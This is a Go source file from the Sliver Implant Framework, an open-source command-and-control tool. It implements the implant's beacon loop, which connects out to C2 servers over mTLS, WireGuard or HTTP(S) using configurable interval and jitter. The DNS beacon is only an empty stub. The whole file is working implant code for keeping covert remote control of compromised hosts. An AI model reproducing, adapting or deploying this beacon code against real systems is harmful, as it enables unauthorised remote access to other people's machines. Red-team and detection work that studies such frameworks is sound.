package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"

	// {{end}}

	insecureRand "math/rand"
	"net/url"
	"time"

	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
	"strconv"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"crypto/tls"

	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"

	// {{end}}

	// {{if .Config.HTTPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	// {{end}}

	// {{if .Config.WGc2Enabled}}
	"errors"
	"net"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
	"golang.zx2c4.com/wireguard/device"

	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

type BeaconStart func() error
type BeaconRecv func() (*pb.Envelope, error)
type BeaconSend func(*pb.Envelope) error
type BeaconClose func() error

// Beacon - Abstract connection to the server
type Beacon struct {
	Start BeaconStart
	Send  BeaconSend
	Recv  BeaconRecv
	Close BeaconClose
}

func (b *Beacon) Interval() int64 {
	interval, err := strconv.Atoi(`{{.Config.BeaconInterval}}`)
	if err != nil {
		interval = int(30 * time.Second)
	}
	return int64(interval)
}

func (b *Beacon) Jitter() int64 {
	jitter, err := strconv.Atoi(`{{.Config.BeaconJitter}}`)
	if err != nil {
		jitter = int(30 * time.Second)
	}
	return int64(jitter)
}

func (b *Beacon) Duration() time.Duration {
	// {{if .Config.Debug}}
	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
	// {{end}}
	jitterDuration := time.Duration(0)
	if 0 < b.Jitter() {
		jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
	}
	duration := time.Duration(b.Interval()) + jitterDuration
	// {{if .Config.Debug}}
	log.Printf("Duration: %v", duration)
	// {{end}}
	return duration
}

func StartBeaconLoop() *Beacon {
	// {{if .Config.Debug}}
	log.Printf("Starting beacon loop ...")
	// {{end}}

	beaconAttempts := 0
	for beaconAttempts < maxErrors {

		var beacon *Beacon
		var err error

		uri := nextCCServer()
		// {{if .Config.Debug}}
		log.Printf("Next CC = %s", uri.String())
		// {{end}}

		switch uri.Scheme {

		// *** MTLS ***
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			beacon, err = mtlsBeacon(uri)
			if err == nil {
				activeC2 = uri.String()
				return beacon
			}
			// {{if .Config.Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
			beaconAttempts++
			// {{end}}  - MTLSc2Enabled
		case "wg":
			// *** WG ***
			// {{if .Config.WGc2Enabled}}
			beacon, err = wgBeacon(uri)
			if err == nil {
				activeC2 = uri.String()
				return beacon
			}
			// {{if .Config.Debug}}
			log.Printf("[wg] Connection failed %s", err)
			// {{end}}
			beaconAttempts++
			// {{end}}  - WGc2Enabled
		case "https":
			fallthrough
		case "http":
			// *** HTTP ***
			// {{if .Config.HTTPc2Enabled}}
			beacon, err = httpBeacon(uri)
			if err == nil {
				activeC2 = uri.String()
				return beacon
			}
			// {{if .Config.Debug}}
			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
			// {{end}}
			beaconAttempts++
			// {{end}} - HTTPc2Enabled

		case "dns":
			// *** DNS ***
			// {{if .Config.DNSc2Enabled}}
			beacon, err = dnsBeacon(uri)
			if err == nil {
				activeC2 = uri.String()
				return beacon
			}
			// {{if .Config.Debug}}
			log.Printf("[dns] Connection failed %s", err)
			// {{end}}
			beaconAttempts++
			// {{end}} - DNSc2Enabled

		default:
			// {{if .Config.Debug}}
			log.Printf("Unknown c2 protocol %s", uri.Scheme)
			// {{end}}
		}

		reconnect := GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Sleep %d second(s) ...", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
	// {{if .Config.Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}

	return nil
}

// {{if .Config.MTLSc2Enabled}}
func mtlsBeacon(uri *url.URL) (*Beacon, error) {
	// {{if .Config.Debug}}
	log.Printf("Establishing Beacon -> %s", uri.String())
	// {{end}}
	var err error
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}

	var conn *tls.Conn
	beacon := &Beacon{
		Start: func() error {
			conn, err = mtls.MtlsConnect(uri.Hostname(), uint16(lport))
			if err != nil {
				return err
			}
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return mtls.ReadEnvelope(conn)
		},
		Send: func(envelope *pb.Envelope) error {
			return mtls.WriteEnvelope(conn, envelope)
		},
		Close: func() error {
			err = conn.Close()
			if err != nil {
				return err
			}
			conn = nil
			return nil
		},
	}

	return beacon, nil
}

// {{end}}

// {{if .Config.WGc2Enabled}}
func wgBeacon(uri *url.URL) (*Beacon, error) {
	// {{if .Config.Debug}}
	log.Printf("Establishing Beacon -> %s", uri.String())
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 53
	}
	addrs, err := net.LookupHost(uri.Hostname())
	if err != nil {
		return nil, err
	}
	if len(addrs) == 0 {
		return nil, errors.New("{{if .Config.Debug}}Invalid address{{end}}")
	}
	hostname := addrs[0]

	var conn net.Conn
	var dev *device.Device
	beacon := &Beacon{
		Start: func() error {
			conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
			if err != nil {
				return err
			}
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return wireguard.ReadEnvelope(conn)
		},
		Send: func(envelope *pb.Envelope) error {
			return wireguard.WriteEnvelope(conn, envelope)
		},
		Close: func() error {
			err = conn.Close()
			if err != nil {
				return err
			}
			err = dev.Down()
			if err != nil {
				return err
			}
			conn = nil
			dev = nil
			return nil
		},
	}
	return beacon, nil
}

// {{end}}

// {{if .Config.HTTPc2Enabled}}
func httpBeacon(uri *url.URL) (*Beacon, error) {

	// {{if .Config.Debug}}
	log.Printf("Beaconing -> %s", uri)
	// {{end}}
	proxyConfig := uri.Query().Get("proxy")
	timeout := GetPollTimeout()
	client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("http(s) connection error %s", err)
		// {{end}}
		return nil, err
	}
	proxyURL = client.ProxyURL

	beacon := &Beacon{
		Start: func() error {
			return client.SessionInit()
		},
		Recv: func() (*pb.Envelope, error) {
			return client.ReadEnvelope()
		},
		Send: func(envelope *pb.Envelope) error {
			return client.WriteEnvelope(envelope)
		},
	}

	return beacon, nil
}

// {{end}}

// {{if .Config.DNSc2Enabled}}
func dnsBeacon(uri *url.URL) (*Beacon, error) {
	return nil, nil
}

// {{end}}
